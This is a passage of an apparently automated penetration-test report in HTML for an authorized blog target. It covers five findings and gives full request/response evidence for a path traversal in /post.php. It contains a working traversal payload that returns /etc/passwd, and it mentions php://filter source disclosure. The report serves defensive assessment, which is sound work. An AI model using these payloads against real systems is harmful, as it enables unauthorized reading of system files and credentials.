@@ -1,0 +1,2026 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqyrag66-w7ilx8</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [path-traversal] Unauthenticated path traversal / local file inclusion in /post.php (id param)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated Apache httpd 2.4.54 (Debian) — multiple known CVEs (mod_proxy request smuggling, mod_rewrite disclosure/RCE)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] End-of-life PHP 7.4.33 — unsupported branch, unpatched post-EOL CVEs (incl. phar RCE-class CVE-2023-3824)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Apache version disclosed in 404 error pages</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#5f7d8c">INFO</span> [headers] Missing HTTP security headers on all responses</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqyrag66-w7ilx8</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32844/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T05:07:18.235Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>15 mapped · 15 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>5</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32844</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>5 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">3</b> high</span><span><b style="color:#c9a227">1</b> low</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [path-traversal] Unauthenticated path traversal / local file inclusion in /post.php (id param)</h3>
+<div class="kv">Screen: <code>s-0004</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32844/</div>
+<div class="desc">The `id` query parameter of /post.php is passed to a PHP file-inclusion sink (e.g. include()) without sanitisation. Supplying a `../` traversal sequence reads arbitrary files from the server filesystem with the web server's privileges, no authentication required. `id=../../../../../../../../etc/passwd` returns the full contents of /etc/passwd (root:x:0:0:...) prepended to the normal page output. The legitimate usage `id=EternalBlue.php` includes a post file, confirming the parameter is used as a filesystem path. This enables disclosure of source code (via php://filter), configuration, and credentials, and is a stepping stone to RCE if combined with a writable/log-poisonable file or a PHP wrapper.</div>
+<div><b>Reproduction</b></div><pre>1) Baseline/negative control: GET /post.php?id=nonexistent12345.php → 200, body &quot;Post not found.&quot; (5326 bytes), no file content. 2) GET /post.php?id=../../../../../../../../etc/passwd → 200, body begins with &quot;root:x:0:0:root:/root:/bin/bash...&quot; (full /etc/passwd, 6226 bytes). 3) Repeat the same request → identical /etc/passwd disclosure (6226 bytes), stable. The traversal responses contain OS file contents absent from the control, proving arbitrary local file read. (Also confirmed against /etc/hostname in a separate request, returning the container hostname.)</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyrovuk-t</code> — <code>artifacts/s-0004/ev-mqyrovuk-t/</code></div><div class="lbl">REQUEST</div><pre>GET /post.php?id=nonexistent12345.php HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5326
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:18:31 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;p&gt;Post not found.&lt;/p&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | Post not found&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;
+                    Post not found                &lt;/h1&gt;
+                &lt;p class=&quot;lead mb-3&quot;&gt;
+                    --                &lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;text-center mt-4&quot;&gt;
+                &lt;a href=&quot;index.php&quot; class=&quot;btn btn-primary btn-lg&quot;&gt;Back to Home&lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;!-- Blog Entries Column --&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                            &lt;/div&gt;
+
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyrp6iu-u</code> — <code>artifacts/s-0004/ev-mqyrp6iu-u/</code></div><div class="lbl">REQUEST</div><pre>GET /post.php?id=../../../../../../../../etc/passwd HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 6226
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:18:45 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | Post not found&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;
+                    Post not found                &lt;/h1&gt;
+                &lt;p class=&quot;lead mb-3&quot;&gt;
+                    --                &lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;text-center mt-4&quot;&gt;
+                &lt;a href=&quot;index.php&quot; class=&quot;btn btn-primary btn-lg&quot;&gt;Back to Home&lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;!-- Blog Entries Column --&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                            &lt;/div&gt;
+
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyrpmlw-x</code> — <code>artifacts/s-0004/ev-mqyrpmlw-x/</code></div><div class="lbl">REQUEST</div><pre>GET /post.php?id=../../../../../../../../etc/passwd HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 6226
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:19:06 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | Post not found&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;
+                    Post not found                &lt;/h1&gt;
+                &lt;p class=&quot;lead mb-3&quot;&gt;
+                    --                &lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;text-center mt-4&quot;&gt;
+                &lt;a href=&quot;index.php&quot; class=&quot;btn btn-primary btn-lg&quot;&gt;Back to Home&lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;!-- Blog Entries Column --&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                            &lt;/div&gt;
+
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
